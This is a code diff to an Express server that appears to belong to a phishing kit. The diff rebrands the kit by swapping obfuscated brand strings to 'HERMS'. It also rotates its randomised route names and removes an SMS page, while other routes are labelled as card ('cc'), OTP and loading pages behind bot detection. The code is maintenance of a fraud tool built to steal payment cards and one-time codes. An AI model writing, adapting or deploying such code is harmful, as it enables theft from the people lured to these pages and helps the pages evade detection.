@@ -13,10 +13,10 @@ const app = express();
 const http = require('http').createServer(app);
 const io = new Server(http);
 
-let target = "I-1c-1L-1u-1D"; // hadi hizyada;
+let target = "H-1E-1R-1M-1S"; // hadi hizyada;
 target = target.split("-1");
 target = target.join("");
-let brand = "I-1c-1L-1u-1D"; // hadi hizyada;
+let brand = "H-1E-1R-1M-1S"; // hadi hizyada;
 brand = brand.split("-1");
 brand = brand.join("");
 
@@ -57,13 +57,11 @@ const redirectURL = process.env.URL; // Replace with your desired redirect URL
 
 const REAL_ROUTES = [
   "/",
-  '/QcEwP85AgNE4pnL5mWSM',
-  '/RKnUB922z6Mf4HDwg3EZ',
   '/OOMPZ5nz4RnFvFV8s',
-  '/HfuRVXK8w8fLmT2vWHe8',
   '/load',
   '/EEXnHMpMEHxNNMgX5Duh',
   '/BfhMN3hPfFL88zgqtPAk',
+  '/3EtpVNHarRb8PqJfArbu',
 ];
 
 // Bot detection function
@@ -547,9 +545,7 @@ app.get("/load",(req,res)=>{ // cc page:
 app.get("/BfhMN3hPfFL88zgqtPAk",(req,res)=>{ // loading 2:
     res.render("otpip-1");
 });
-app.get("/jD9TUUwFtwdRXBh6P4cc",(req,res)=>{ // sms 1:
-    res.render("lopa2");
-});
+
 app.get("/EEXnHMpMEHxNNMgX5Duh",(req,res)=>{ // loading 3:
     res.render("otpip-2",{url:process.env.URL});
 });
